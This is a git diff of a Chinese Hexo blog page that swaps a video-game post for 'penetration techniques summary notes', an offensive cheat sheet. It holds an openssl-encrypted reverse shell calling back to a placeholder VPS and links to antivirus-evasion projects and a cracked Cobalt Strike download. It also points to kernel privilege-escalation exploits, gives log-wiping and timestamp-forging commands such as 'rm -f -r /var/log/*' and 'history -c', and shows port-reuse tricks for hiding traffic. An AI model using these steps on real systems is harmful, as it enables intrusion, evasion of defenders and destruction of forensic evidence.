@@ -6,23 +6,24 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>伊苏8 | 戏如烟云b16</title>
+  <title>渗透技巧汇总笔记 | 戏如烟云b16</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="伊苏系类从初1就接触了，唯美而又轻松的画风让人放松，boos和音乐的切入也很震撼人心。伊苏6，7，起源，誓约都给人一种热血冒险的感觉。现在伊苏8新作也上市咯，开始冒险之旅吧！">
-<meta name="keywords" content="娱乐">
+  <meta name="description" content="前言首先我们拿到一个站不能心急，凡事三思而行 跑得太快是会滑倒的。网络安全方面可以看看我的另一篇防范技巧： 点此跳转 当我们获得目标的时候不要急着用扫描器，这样会不仅会影响服务器的速度还会在对方的服务器日志生成大量的记录，什么站能扫什么站不能扫，心里一定要有点b数，不然可能等待的就是不一样的结果了。如果手工测试无果后再用代理手法扫描网站，必要的时候设置二级代理。当然！！！！什么站能扫什么站不能扫，">
+<meta name="keywords" content="web技术,笔记">
 <meta property="og:type" content="article">
-<meta property="og:title" content="伊苏8">
-<meta property="og:url" content="http://yoursite.com/2017/08/09/伊苏8游戏/index.html">
+<meta property="og:title" content="渗透技巧汇总笔记">
+<meta property="og:url" content="http://yoursite.com/2020/08/06/渗透技巧汇总笔记/index.html">
 <meta property="og:site_name" content="戏如烟云b16">
-<meta property="og:description" content="伊苏系类从初1就接触了，唯美而又轻松的画风让人放松，boos和音乐的切入也很震撼人心。伊苏6，7，起源，誓约都给人一种热血冒险的感觉。现在伊苏8新作也上市咯，开始冒险之旅吧！">
+<meta property="og:description" content="前言首先我们拿到一个站不能心急，凡事三思而行 跑得太快是会滑倒的。网络安全方面可以看看我的另一篇防范技巧： 点此跳转 当我们获得目标的时候不要急着用扫描器，这样会不仅会影响服务器的速度还会在对方的服务器日志生成大量的记录，什么站能扫什么站不能扫，心里一定要有点b数，不然可能等待的就是不一样的结果了。如果手工测试无果后再用代理手法扫描网站，必要的时候设置二级代理。当然！！！！什么站能扫什么站不能扫，">
 <meta property="og:locale" content="zh-cn">
-<meta property="og:image" content="http://yoursite.com/2017/08/09/伊苏8游戏/2.jpg">
-<meta property="og:image" content="http://yoursite.com/2017/08/09/伊苏8游戏/1.jpg">
-<meta property="og:updated_time" content="2018-12-12T06:34:09.452Z">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20181028004554212.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTE5NzUzNjM=,size_27,color_FFFFFF,t_70">
+<meta property="og:image" content="https://github.com/huoji120/Antivirus_R3_bypass_demo/raw/master/images/0day%E6%B5%8B%E8%AF%95-%E7%81%AB%E7%BB%92.gif">
+<meta property="og:image" content="https://i.niupic.com/images/2020/01/09/6gm0.jpg">
+<meta property="og:updated_time" content="2020-08-09T09:37:52.286Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="伊苏8">
-<meta name="twitter:description" content="伊苏系类从初1就接触了，唯美而又轻松的画风让人放松，boos和音乐的切入也很震撼人心。伊苏6，7，起源，誓约都给人一种热血冒险的感觉。现在伊苏8新作也上市咯，开始冒险之旅吧！">
-<meta name="twitter:image" content="http://yoursite.com/2017/08/09/伊苏8游戏/2.jpg">
+<meta name="twitter:title" content="渗透技巧汇总笔记">
+<meta name="twitter:description" content="前言首先我们拿到一个站不能心急，凡事三思而行 跑得太快是会滑倒的。网络安全方面可以看看我的另一篇防范技巧： 点此跳转 当我们获得目标的时候不要急着用扫描器，这样会不仅会影响服务器的速度还会在对方的服务器日志生成大量的记录，什么站能扫什么站不能扫，心里一定要有点b数，不然可能等待的就是不一样的结果了。如果手工测试无果后再用代理手法扫描网站，必要的时候设置二级代理。当然！！！！什么站能扫什么站不能扫，">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20181028004554212.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTE5NzUzNjM=,size_27,color_FFFFFF,t_70">
   
     <link rel="alternative" href="/atom.xml" title="戏如烟云b16" type="application/atom+xml">
   
@@ -158,28 +159,65 @@ var _hmt = _hmt || [];
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-伊苏8游戏" class="article article-type-post " itemscope="" itemprop="blogPost">
+            <article id="post-渗透技巧汇总笔记" class="article article-type-post " itemscope="" itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      伊苏8
+      渗透技巧汇总笔记
     </h1>
   
 
         
-        <a href="/2017/08/09/伊苏8游戏/" class="archive-article-date">
-  	<time datetime="2017-08-09T08:41:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-08-09</time>
+        <a href="/2020/08/06/渗透技巧汇总笔记/" class="archive-article-date">
+  	<time datetime="2020-08-06T05:49:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-08-06</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>伊苏系类从初1就接触了，唯美而又轻松的画风让人放松，boos和音乐的切入也很震撼人心。<br>伊苏6，7，起源，誓约都给人一种热血冒险的感觉。现在伊苏8新作也上市咯，开始冒险之旅吧！<br> <a id="more"></a><br><img src="/2017/08/09/伊苏8游戏/2.jpg" alt=""></p>
-<p>游戏的舞台为曾经被称作“永远的被诅咒之岛”、之后在人们记忆中逐渐被淡忘的岛屿“塞莲岛”，那里有着原始的自然、奇妙的生物们与广阔的未开拓领域，此外还残存着迷之古代文明遗迹。<br><img src="/2017/08/09/伊苏8游戏/1.jpg" alt=""></p>
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>首先我们拿到一个站不能心急，凡事三思而行 跑得太快是会滑倒的。网络安全方面可以看看我的另一篇防范技巧： <a href="https://myxiaoshen.github.io/2019/01/18/%E5%A4%A7%E6%95%B0%E6%8D%AE%E4%B8%8B%E4%BF%9D%E6%8A%A4%E8%87%AA%E5%B7%B1%E7%9A%84%E9%9A%90%E7%A7%81/" target="_blank" rel="noopener">点此跳转</a></p>
+<p>当我们获得目标的时候不要急着用扫描器，这样会不仅会影响服务器的速度还会在对方的服务器日志生成大量的记录，什么站能扫什么站不能扫，心里一定要有点b数，不然可能等待的就是不一样的结果了。如果手工测试无果后再用代理手法扫描网站，必要的时候设置二级代理。当然！！！！什么站能扫什么站不能扫，心里一定要有点b数！小提示：在使用proxychains的时候，程序或者终端选项尽量不要设置任何协议的代理,否则可能会打乱这个代理回路出现网络错误。</p>
+<p><img src="https://img-blog.csdnimg.cn/20181028004554212.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTE5NzUzNjM=,size_27,color_FFFFFF,t_70" alt=""><br><a id="more"></a></p>
+<h4 id="zero"><a href="#zero" class="headerlink" title="zero"></a>zero</h4><p>首先进行信息收集你获得的信息越多对自己后面的渗透就越有帮助，whois，旁站子域，服务器操作系统版本，web中间件以及waf与cdn，通过google与github看看是否存在已知的漏洞这样有助于快速的获得权限，端口扫描并判断服务漏洞加以利用，目录的fuzz，弱口令的fuzz，google hack 进一步探测网站的信息后台以及敏感信息，撒旦天眼也是不错的信息工具。</p>
+<h4 id="一-时刻关注返回的数据包"><a href="#一-时刻关注返回的数据包" class="headerlink" title="一.时刻关注返回的数据包"></a>一.时刻关注返回的数据包</h4><p>漏洞有很多种类型都需要渗透方认证仔细的对每个数据包已经url进行验证，要相信所有的努力都是为成功而付出的。如XSS,XSRF,sql注入，代码执行，命令执行，越权访问，目录读取，任意文件读取，下载，文件包含，远程命令执行，弱口令，上传，编辑器漏洞，暴力破解等</p>
+<ol>
+<li>验证码与邮箱以及token的返回泄露，以及后台为校验从而可删除的参数。</li>
+<li>截获的敏感数据参数，学会在多个数据包反复尝试。</li>
+<li>从某个成功请求中捕获数据包观察cookie或者token是否存在规律或加密。</li>
+<li>通过修改返回的状态值，触发js进行逻辑漏洞的渗透。</li>
+<li>token的key参数解密构建获取真实user密钥，可拼接、规律、时间戳……</li>
+</ol>
+<h4 id="二-fuzz的艺术"><a href="#二-fuzz的艺术" class="headerlink" title="二.fuzz的艺术"></a>二.fuzz的艺术</h4><p><a href="https://www.freebuf.com/vuls/221129.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/221129.html</a></p>
+<h4 id="三-AVbypass"><a href="#三-AVbypass" class="headerlink" title="三.AVbypass"></a>三.AVbypass</h4><p>linux反弹 shell：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1）VPS 上生成 ssl 证书的公钥/私钥对：</span><br><span class="line">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes</span><br><span class="line">2）VPS 监听反弹 shell：</span><br><span class="line">openssl s_server -quiet -key key.pem -cert cert.pem -port 80</span><br><span class="line">3）目标上回连 shell：</span><br><span class="line">mkfifo /tmp/s; /bin/bash -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect &lt;your_vps&gt;:1024 &gt; /tmp/s; rm /tmp/s</span><br><span class="line"></span><br><span class="line">VPS 上已获取加密的 getshell 了。</span><br></pre></td></tr></table></figure></p>
+<p>winodws桌面：TeamViewerQS单文件<br>windowsAV（360过不了）项目地址：<a href="https://github.com/huoji120/Antivirus_R3_bypass_demo" target="_blank" rel="noopener">https://github.com/huoji120/Antivirus_R3_bypass_demo</a><br><img src="https://github.com/huoji120/Antivirus_R3_bypass_demo/raw/master/images/0day%E6%B5%8B%E8%AF%95-%E7%81%AB%E7%BB%92.gif" alt=""></p>
+<p>waf：中国蚁剑客户端，冰蝎，反复尝试使用编码字节绕过</p>
+<h4 id="四-提权与权限维持"><a href="#四-提权与权限维持" class="headerlink" title="四.提权与权限维持"></a>四.提权与权限维持</h4><p>首先通过检查目标服务器的进程与可利用服务以及漏洞</p>
+<h5 id="老牌工具Cobaltstrike-Profiles"><a href="#老牌工具Cobaltstrike-Profiles" class="headerlink" title="老牌工具Cobaltstrike+Profiles"></a>老牌工具Cobaltstrike+Profiles</h5><p>修改CS默认的流量特征Profiles： <a href="https://github.com/rsmudge/Malleable-C2-Profiles" target="_blank" rel="noopener">https://github.com/rsmudge/Malleable-C2-Profiles</a><br><a href="https://pan.baidu.com/s/1Ns_mzzcjUne9xsz9M78lHw" target="_blank" rel="noopener">Cobaltstrike 3.14正式版破解+汉化下载地址</a>  提取码: 8iee<br>Cobaltstrike推荐插件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">AVQuery.nsa （通过检查注册表键值来判断杀毒软件）</span><br><span class="line"></span><br><span class="line">ProcessColor.cna（显示带有颜色的进程列表）</span><br><span class="line"></span><br><span class="line">ProcessMonitor.cna（指定时间段内对于程序运行情况的监控）</span><br><span class="line"></span><br><span class="line">elevate.cna（增加五种提权方式）</span><br></pre></td></tr></table></figure></p>
+<h5 id="免杀远控整理（来自Tide团队"><a href="#免杀远控整理（来自Tide团队" class="headerlink" title="免杀远控整理（来自Tide团队)"></a>免杀远控整理（来自Tide团队)</h5><p><img src="https://i.niupic.com/images/2020/01/09/6gm0.jpg" alt=""><br>项目地址:<a href="https://github.com/QChiLan/BypassAntiVirus" target="_blank" rel="noopener">https://github.com/QChiLan/BypassAntiVirus</a></p>
+<h5 id="通过ssl加密palyoad"><a href="#通过ssl加密palyoad" class="headerlink" title="通过ssl加密palyoad"></a>通过ssl加密palyoad</h5><h5 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h5><p>Exploit批量扫描：Windows-Exploit-Suggester<br>漏洞模块：<a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank" rel="noopener">https://github.com/SecWiki/windows-kernel-exploits</a><br>BITS免杀提权：<a href="https://github.com/ohpe/juicy-potato" target="_blank" rel="noopener">https://github.com/ohpe/juicy-potato</a></p>
+<h5 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h5><p>搜寻配置文件中的明文密码、sudo滥用<br>Exploit批量扫描：linux-exploit-suggester、linux-exploit-suggester-2<br>漏洞模块：<a href="https://github.com/SecWiki/linux-kernel-exploits" target="_blank" rel="noopener">https://github.com/SecWiki/linux-kernel-exploits</a></p>
+<h4 id="五、日志清理（细心的安全工程师会更改位置并定时备份后渗透主要还是靠细心）"><a href="#五、日志清理（细心的安全工程师会更改位置并定时备份后渗透主要还是靠细心）" class="headerlink" title="五、日志清理（细心的安全工程师会更改位置并定时备份后渗透主要还是靠细心）"></a>五、日志清理（细心的安全工程师会更改位置并定时备份后渗透主要还是靠细心）</h4><p>windows<br>遇见不能删除的先停止相关服务：net stop “task scheduler”<br>系统日志推荐使用工具： clearlog.exe</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">防火墙日志路径：%systemroot%\system32\logfiles\</span><br><span class="line">IIS日志路径：%systemroot%\system32\logfles\</span><br><span class="line">windows系统日志：%systemroot%\system32\config\</span><br><span class="line">Scheduler服务日志：%systemroot%\schedlgu.txt</span><br></pre></td></tr></table></figure>
+<p>linux（检索根目录以及上级目录是否存在备份）</p>
+<p>1.清空当前用户历史命令并删除相关文件：<br>history -c </p>
+<p>echo “”&gt; /root/.bash_history</p>
+<p>echo “”&gt; /var/run/utmp</p>
+<p>2.清除部分日志：echo “”&gt; /var/log/secure；全删除如不能删除使用echo依次覆盖：rm -f -r /var/log/*；<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">/var/log/boot.log：录了系统在引导过程中发生的事件，就是Linux系统开机自检过程显示的信息</span><br><span class="line"></span><br><span class="line">/var/log/lastlog ：记录最后一次用户成功登陆的时间、登陆IP等信息</span><br><span class="line"></span><br><span class="line">/var/log/messages ：记录Linux操作系统常见的系统和服务错误信息</span><br><span class="line"></span><br><span class="line">/var/log/secure ：Linux系统安全日志，记录用户和工作组变坏情况、用户登陆认证情况</span><br><span class="line"></span><br><span class="line">/var/log/btmp ：记录Linux登陆失败的用户、时间以及远程IP地址</span><br><span class="line"></span><br><span class="line">/var/log/syslog：只记录警告信息，常常是系统出问题的信息，使用lastlog查看</span><br><span class="line"></span><br><span class="line">/var/log/wtmp：该日志文件永久记录每个用户登录、注销及系统的启动、停机的事件，使用last命令查看</span><br><span class="line"></span><br><span class="line">/var/log/maillog 与邮件相关的日志信息</span><br><span class="line"></span><br><span class="line">/var/log/cron 与定时任务相关的日志信息</span><br><span class="line"></span><br><span class="line">/var/log/spooler 与UUCP和news设备相关的日志信息</span><br><span class="line"></span><br><span class="line">/var/log/auth.log 系统授权信息，包括用户登录和使用的权限机制等 (debian)</span><br><span class="line"></span><br><span class="line">/var/run/utmp：该日志文件记录有关当前登录的每个用户的信息。如 who、w、users、finger等就需要访问这个文件</span><br></pre></td></tr></table></figure></p>
+<p>3.更新test.txt的时间和test2.txt时间戳相同：touch -r test.txt test2.txt;设定时间戳：touch -t 201605171210.20 test.txt</p>
+<h5 id="web容器路径"><a href="#web容器路径" class="headerlink" title="web容器路径"></a>web容器路径</h5><p>数据库通过查询配置文件定位日志（如mysql的配置文件文件my.inf，tomcat的配置文件tomcat-user.xml）</p>
+<p>winodws<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apche： C:\Program Files\Apache Software Foundation\Apache2.2\htdocs&quot;</span><br><span class="line">tomact:C\Program Files\tomcat\log</span><br><span class="line">nignx: C\Program Files\nginx-1.14.2\logs\</span><br></pre></td></tr></table></figure></p>
+<p>linux<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tomcat：/usr/local/tomcat/logs/</span><br><span class="line">apche： /usr/local/apache/logs/access_log</span><br><span class="line">nignx:/var/log/httpd/error_log  rm -f -r /var/log/*</span><br></pre></td></tr></table></figure></p>
+<h4 id="七、后渗透与流量隐匿"><a href="#七、后渗透与流量隐匿" class="headerlink" title="七、后渗透与流量隐匿"></a>七、后渗透与流量隐匿</h4><h5 id="frsocks-protoplex-流量重定向实现端口复用"><a href="#frsocks-protoplex-流量重定向实现端口复用" class="headerlink" title="frsocks+protoplex+流量重定向实现端口复用"></a>frsocks+protoplex+流量重定向实现端口复用</h5><pre><code>./frsocks -sockstype fsocks -listen 2333  //创建本地监听
+./protoplex --socks5 192.168.154.130:2333 --http 127.0.0.1:80 -b 192.168.154.130:9999  //端口分流，根据协议类型转到本地的2333和80端口
+</code></pre><p>重定向命令<br>linux：</p>
+<pre><code>sudo iptables -t nat -A PREROUTING -p tcp -m tcp --dport 80 -j REDIRECT --to-ports 9999
+</code></pre><p>windows:</p>
+<pre><code>netsh interface portproxy add v4tov4 listenport=80 listen address=192.168.154.129 connectport=9999 connectaddress=192.168.154.129
+</code></pre><h5 id="msf后渗透一条龙"><a href="#msf后渗透一条龙" class="headerlink" title="msf后渗透一条龙"></a>msf后渗透一条龙</h5><p><a href="https://blog.csdn.net/qq_33020901/article/details/98357659" target="_blank" rel="noopener">https://blog.csdn.net/qq_33020901/article/details/98357659</a></p>
 
       
 
@@ -193,7 +231,11 @@ var _hmt = _hmt || [];
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">娱乐</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">web技术</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">笔记</a>
         		</li>
       		
 		</ul>
@@ -249,7 +291,7 @@ var _hmt = _hmt || [];
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="http://s.jiathis.com/qrcode.php?url=http://yoursite.com/2017/08/09/伊苏8游戏/" alt="微信分享二维码">
+      <img src="http://s.jiathis.com/qrcode.php?url=http://yoursite.com/2020/08/06/渗透技巧汇总笔记/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -263,18 +305,9 @@ var _hmt = _hmt || [];
   
 <nav id="article-nav">
   
-    <a href="/2017/08/11/开发后台时需用到的PHP获取服务器的信息/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          开发后台时需用到的PHP获取服务器的信息
-        
-      </div>
-    </a>
   
-  
-    <a href="/2017/08/09/laravel开发笔记/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">laravel笔记</div>
+    <a href="/2020/08/01/伊苏8游戏/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">伊苏</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -301,7 +334,7 @@ var _hmt = _hmt || [];
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    目录，不存在的…
+                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#zero"><span class="toc-number">1.1.</span> <span class="toc-text">zero</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#一-时刻关注返回的数据包"><span class="toc-number">1.2.</span> <span class="toc-text">一.时刻关注返回的数据包</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#二-fuzz的艺术"><span class="toc-number">1.3.</span> <span class="toc-text">二.fuzz的艺术</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#三-AVbypass"><span class="toc-number">1.4.</span> <span class="toc-text">三.AVbypass</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#四-提权与权限维持"><span class="toc-number">1.5.</span> <span class="toc-text">四.提权与权限维持</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#老牌工具Cobaltstrike-Profiles"><span class="toc-number">1.5.1.</span> <span class="toc-text">老牌工具Cobaltstrike+Profiles</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#免杀远控整理（来自Tide团队"><span class="toc-number">1.5.2.</span> <span class="toc-text">免杀远控整理（来自Tide团队)</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#通过ssl加密palyoad"><span class="toc-number">1.5.3.</span> <span class="toc-text">通过ssl加密palyoad</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#windows"><span class="toc-number">1.5.4.</span> <span class="toc-text">windows</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#linux"><span class="toc-number">1.5.5.</span> <span class="toc-text">linux</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#五、日志清理（细心的安全工程师会更改位置并定时备份后渗透主要还是靠细心）"><span class="toc-number">1.6.</span> <span class="toc-text">五、日志清理（细心的安全工程师会更改位置并定时备份后渗透主要还是靠细心）</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#web容器路径"><span class="toc-number">1.6.1.</span> <span class="toc-text">web容器路径</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#七、后渗透与流量隐匿"><span class="toc-number">1.7.</span> <span class="toc-text">七、后渗透与流量隐匿</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#frsocks-protoplex-流量重定向实现端口复用"><span class="toc-number">1.7.1.</span> <span class="toc-text">frsocks+protoplex+流量重定向实现端口复用</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#msf后渗透一条龙"><span class="toc-number">1.7.2.</span> <span class="toc-text">msf后渗透一条龙</span></a></li></ol></li></ol></li></ol>
                     </div>
                 </span>
             </div>
